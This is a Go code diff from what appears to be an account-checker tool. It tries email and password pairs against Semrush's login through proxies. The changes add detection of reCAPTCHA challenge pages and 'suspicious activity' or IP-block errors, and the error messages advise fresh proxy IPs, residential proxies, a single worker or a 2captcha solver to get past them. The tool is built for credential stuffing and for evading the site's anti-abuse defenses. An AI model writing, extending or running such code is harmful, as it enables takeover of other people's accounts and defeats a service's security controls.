@@ -150,10 +150,14 @@ func (c *Checker) checkSemrush(email, password string, proxyURL *url.URL) CheckR
 	}
 
 	if failReason := parseSemrushAuthFailure(authBody, authStatus); failReason != "" {
-		if failReason == "recaptcha_required" {
+		switch failReason {
+		case "recaptcha_required":
 			result.Status = StatusRecaptchaRequired
 			result.Reason = "reCAPTCHA required — use 1 worker, fresh proxy IP, or captcha solver token"
-		} else {
+		case "activity_reset":
+			result.Status = StatusRateLimited
+			result.Reason = "Semrush activity reset — retry with fresh proxy IP"
+		default:
 			result.Status = StatusFail
 			result.Reason = failReason
 		}
@@ -299,16 +303,20 @@ func semrushApplySSOToken(client *http.Client, authBody string, headers http.Hea
 
 func semrushMissingTokenFailure(authBody string, authStatus int) (CheckStatus, string) {
 	if fail := parseSemrushAuthFailure(authBody, authStatus); fail != "" {
-		if fail == "recaptcha_required" {
+		switch fail {
+		case "recaptcha_required":
 			return StatusRecaptchaRequired, "reCAPTCHA required — add twocaptcha_api_key or use fresh proxy IP"
+		case "activity_reset":
+			return StatusRateLimited, "Semrush activity reset — retry with fresh proxy IP"
+		default:
+			return StatusFail, fail
 		}
-		return StatusFail, fail
 	}
 	trimmed := strings.TrimSpace(authBody)
 	if trimmed == "" || trimmed == "{}" {
 		return StatusRecaptchaRequired, "reCAPTCHA/IP block — empty authorize response (try residential proxy or 2captcha)"
 	}
-	if semrushResponseNeedsRecaptcha(authBody) {
+	if semrushResponseIsRecaptchaHTML(authBody) || semrushResponseNeedsRecaptcha(authBody) {
 		return StatusRecaptchaRequired, "reCAPTCHA required — Semrush blocked login from this IP"
 	}
 	snippet := trimmed
@@ -657,7 +665,29 @@ func semrushErrorCode(body string) string {
 	return ""
 }
 
+func semrushResponseIsRecaptchaHTML(body string) bool {
+	lower := strings.ToLower(body)
+	if !strings.Contains(lower, "<!doctype") && !strings.Contains(lower, "<html") {
+		return false
+	}
+	for _, marker := range []string{
+		"google.com/recaptcha",
+		"recaptcha/challengepage",
+		"g-recaptcha",
+		"recaptcha/api2",
+		"enterprise/challenge",
+	} {
+		if strings.Contains(lower, marker) {
+			return true
+		}
+	}
+	return false
+}
+
 func semrushResponseNeedsRecaptcha(body string) bool {
+	if semrushResponseIsRecaptchaHTML(body) {
+		return true
+	}
 	code := semrushErrorCode(body)
 	if code == "ERROR_RECAPTCHA" || code == "ERROR_CAPTCHA" || code == "ERROR_RECAPTCHA_NEED" {
 		return true
@@ -682,12 +712,17 @@ func semrushResponseNeedsRecaptcha(body string) bool {
 }
 
 func parseSemrushAuthFailure(body string, status int) string {
+	if semrushResponseIsRecaptchaHTML(body) {
+		return "recaptcha_required"
+	}
 	code := semrushErrorCode(body)
 	lower := strings.ToLower(body)
 
 	switch code {
 	case "ERROR_RECAPTCHA", "ERROR_CAPTCHA", "ERROR_RECAPTCHA_NEED":
 		return "recaptcha_required"
+	case "ERROR_ACTIVITY_RESET_MESSAGE", "ERROR_ACTIVITY_RESET", "ERROR_SUSPICIOUS_ACTIVITY", "ERROR_IP_BLOCKED":
+		return "activity_reset"
 	case "ERROR_INVALID_CREDENTIALS", "ERROR_WRONG_PASSWORD", "ERROR_USER_NOT_FOUND":
 		return "invalid email or password"
 	case "ERROR_UAHASH_INVALID":
